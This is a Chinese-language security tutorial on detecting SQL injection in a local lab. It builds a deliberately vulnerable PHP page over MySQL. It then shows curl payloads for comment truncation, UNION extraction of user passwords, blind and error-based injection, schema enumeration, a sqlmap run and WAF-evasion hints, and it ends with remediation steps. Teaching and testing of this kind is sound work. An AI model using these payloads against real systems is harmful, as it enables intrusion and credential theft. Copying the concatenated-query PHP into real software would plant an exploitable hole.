---
title: "SQL 注入原理与检测"
slug: "sql-injection-detection"
date: 2026-08-30T21:07:05+08:00
lastmod: 2026-10-27T11:30:00+08:00
draft: false
author: ["xuanwo"]
description: "注入点类型、查询位置、UNION 与盲注的检测思路。"
summary: "注入点类型、查询位置、UNION 与盲注的检测思路。"
tags: ["SQL注入", "Web安全", "检测"]
categories: ["Web 安全"]
series: ["Web 安全笔记"]
weight: 10
ShowToc: true
TocOpen: false
hidemeta: false
comments: false
showReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowCodeCopyButtons: true
source_repo: "https://github.com/xuanwoLQL/security-notes/blob/main/web-security/15.SQL注入.md"
---

## 复现流程图

<figure class="note-diagram">
  <img src="/images/notes/sql-injection-detection/workflow.svg" alt="从参数和响应差异出发，判断注入类型，再进行最小化证明和利用。" loading="lazy">
  <figcaption>图 1 · SQL 注入检测决策。从参数和响应差异出发，判断注入类型，再进行最小化证明和利用。</figcaption>
</figure>

## 1. 本地 MySQL 检测环境

```bash
docker run --rm -d --name sqli-detect \
  -e MYSQL_ROOT_PASSWORD=root \
  -p 3306:3306 mysql:8.4
```

初始化：

```bash
cat > /tmp/sqli-detect.sql <<'SQL'
CREATE DATABASE app CHARACTER SET utf8mb4;
USE app;
CREATE TABLE products (
  id INT PRIMARY KEY AUTO_INCREMENT,
  name VARCHAR(64),
  description TEXT,
  released TINYINT DEFAULT 1
);
INSERT INTO products(name, description, released) VALUES
  ('Gift A', 'public', 1),
  ('Gift B', 'hidden', 0),
  ('Gift C', 'public', 1);
CREATE TABLE users (
  id INT PRIMARY KEY AUTO_INCREMENT,
  username VARCHAR(64),
  password VARCHAR(64)
);
INSERT INTO users(username, password) VALUES ('admin', 's3cure');
SQL

docker exec -i sqli-detect mysql -uroot -proot < /tmp/sqli-detect.sql
```

创建 `/tmp/sqli-detect/index.php`：

```php
<?php
$conn = new mysqli("127.0.0.1", "root", "root", "app");
$category = $_GET['category'] ?? 'Gift A';
$sql = "SELECT name, description FROM products
        WHERE name='$category' AND released=1";
$result = $conn->query($sql);

if ($result) {
    while ($row = $result->fetch_assoc()) {
        echo htmlspecialchars($row['name'] . "|" . $row['description']) . "\n";
    }
} else {
    echo "SQL_ERROR: " . $conn->error . "\n";
}
```

```bash
cd /tmp/sqli-detect
php -S 127.0.0.1:8080
```

## 2. 建立基线

```bash
curl -sS --get --data-urlencode 'category=Gift A' \
  'http://127.0.0.1:8080/'
```

预期只返回 `Gift A`。

## 3. 单引号与注释

```bash
curl -sS --get --data-urlencode "category=Gift A' -- " \
  'http://127.0.0.1:8080/'
```

预期会多出 hidden 记录，证明 `released=1` 被注释掉。

布尔条件：

```bash
curl -sS --get --data-urlencode "category=Gift A' OR 1=1-- " \
  'http://127.0.0.1:8080/'
```

## 4. 判断类型

| 类型 | 验证方式 | 本地命令 |
| --- | --- | --- |
| 联合查询 | 返回额外列 | `' UNION SELECT 1,2-- ` |
| 报错注入 | 错误信息回显 | `' AND extractvalue(1,concat(0x7e,database()))-- ` |
| 布尔盲注 | 页面真假不同 | `' AND ascii(substr(database(),1,1))>64-- ` |
| 时间盲注 | 延迟明显 | `' AND sleep(3)-- ` |
| 堆叠查询 | 多语句 | `'; SELECT 1-- ` |

## 5. 确定列数

```bash
curl -sS --get --data-urlencode "category=0' ORDER BY 1-- " \
  'http://127.0.0.1:8080/'
curl -sS --get --data-urlencode "category=0' ORDER BY 2-- " \
  'http://127.0.0.1:8080/'
curl -sS --get --data-urlencode "category=0' ORDER BY 3-- " \
  'http://127.0.0.1:8080/'
```

超过列数会报错。

UNION：

```bash
curl -sS --get --data-urlencode \
  "category=0' UNION SELECT username,password FROM users-- " \
  'http://127.0.0.1:8080/'
```

## 6. 列数据库信息

```bash
curl -sS --get --data-urlencode \
  "category=0' UNION SELECT @@version,database()-- " \
  'http://127.0.0.1:8080/'
```

表名：

```bash
curl -sS --get --data-urlencode \
  "category=0' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- " \
  'http://127.0.0.1:8080/'
```

字段：

```bash
curl -sS --get --data-urlencode \
  "category=0' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_schema=database() AND table_name='users'-- " \
  'http://127.0.0.1:8080/'
```

## 7. sqlmap 辅助

```bash
"D:\PBox-full\python3\python.exe" \
  "D:\PBox-full\tools\gui_scan\sqlmap\sqlmap.py" \
  -u 'http://127.0.0.1:8080/?category=Gift%20A' \
  --batch --dbs --level=3 --risk=2
```

sqlmap 只作为加速器；至少保留一条手工 UNION 验证。

## 8. 排错

| 现象 | 原因 | 处理 |
| --- | --- | --- |
| 单引号无报错 | 错误被隐藏 | 用布尔/时间盲注 |
| UNION 列数错 | 原查询列数不同 | `ORDER BY` 或 NULL 枚举 |
| 数据库不同 | Oracle/PostgreSQL | 使用对应系统表和版本函数 |
| WAF 拦截 | 关键字被过滤 | 大小写、编码、等价函数，但保持最小化 |

## 9. 修复

- 全部 SQL 使用预处理语句；
- 不把用户输入拼进查询；
- 数据库账号只授予必要权限；
- 关闭错误回显；
- 对异常参数和响应做监控。
